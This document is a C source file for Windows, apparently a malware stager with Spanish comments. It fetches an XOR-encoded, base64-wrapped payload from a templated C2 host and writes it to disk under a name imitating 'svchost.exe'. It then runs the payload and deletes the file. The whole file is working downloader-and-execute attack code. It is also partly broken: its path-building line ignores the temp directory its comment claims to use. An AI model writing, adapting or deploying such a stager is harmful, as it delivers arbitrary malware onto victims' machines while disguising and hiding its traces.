#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

#define C2_URL "http://{lhost}/beacon.enc"
#define XOR_KEY 0x33

void xor_data(unsigned char* data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= XOR_KEY;
    }
}

BOOL base64_decode(LPCSTR input, DWORD input_len, BYTE** output, DWORD* output_len) {
    *output_len = 0;
    if (!CryptStringToBinaryA(input, input_len, CRYPT_STRING_BASE64, NULL, output_len, NULL, NULL)) return FALSE;
    *output = (BYTE*)HeapAlloc(GetProcessHeap(), 0, *output_len);
    return *output && CryptStringToBinaryA(input, input_len, CRYPT_STRING_BASE64, *output, output_len, NULL, NULL);
}

int main() {
    HINTERNET hInt = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInt) return 1;

    HINTERNET hConn = InternetOpenUrlA(hInt, C2_URL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConn) { InternetCloseHandle(hInt); return 1; }

    char response[4096];
    DWORD read;
    char* buffer = NULL;
    DWORD total = 0;
    BOOL success = FALSE;

    while (1) {
        if (!InternetReadFile(hConn, response, sizeof(response), &read)) break;
        if (read == 0) { success = TRUE; break; }

        char* tmp = buffer ?
            (char*)HeapReAlloc(GetProcessHeap(), 0, buffer, total + read) :
            (char*)HeapAlloc(GetProcessHeap(), 0, read);

        if (!tmp) break;
        buffer = tmp;
        memcpy(buffer + total, response, read);
        total += read;
    }

    InternetCloseHandle(hConn);
    InternetCloseHandle(hInt);

    if (!success || total == 0 || !buffer) {
        if (buffer) HeapFree(GetProcessHeap(), 0, buffer);
        return 1;
    }

    BYTE* raw_payload;
    DWORD raw_len;
    if (!base64_decode(buffer, total, &raw_payload, &raw_len)) {
        HeapFree(GetProcessHeap(), 0, buffer);
        return 1;
    }

    xor_data(raw_payload, raw_len);

    // Obtener %TEMP%
    char temp_path[MAX_PATH];
    if (!GetTempPathA(MAX_PATH, temp_path)) {
        HeapFree(GetProcessHeap(), 0, buffer);
        HeapFree(GetProcessHeap(), 0, raw_payload);
        return 1;
    }

    // Nombre aleatorio: temp1234.exe
    char target_path[MAX_PATH];
    sprintf(target_path, "svchost.exe", temp_path, "temp");
    for (int i = 0; i < 4; i++) {
        target_path[strlen(target_path) - 4 + i] = 'A' + rand() % 26;
    }

    // Escribir archivo
    HANDLE hFile = CreateFileA(target_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        HeapFree(GetProcessHeap(), 0, buffer);
        HeapFree(GetProcessHeap(), 0, raw_payload);
        return 1;
    }

    DWORD written;
    WriteFile(hFile, raw_payload, raw_len, &written, NULL);
    CloseHandle(hFile);

    // Ejecutar
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    if (CreateProcessA(target_path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        Sleep(2000);  // Esperar 2 segundos para que inicie
    }

    // Borrar archivo
    DeleteFileA(target_path);

    HeapFree(GetProcessHeap(), 0, buffer);
    HeapFree(GetProcessHeap(), 0, raw_payload);
    return 0;
}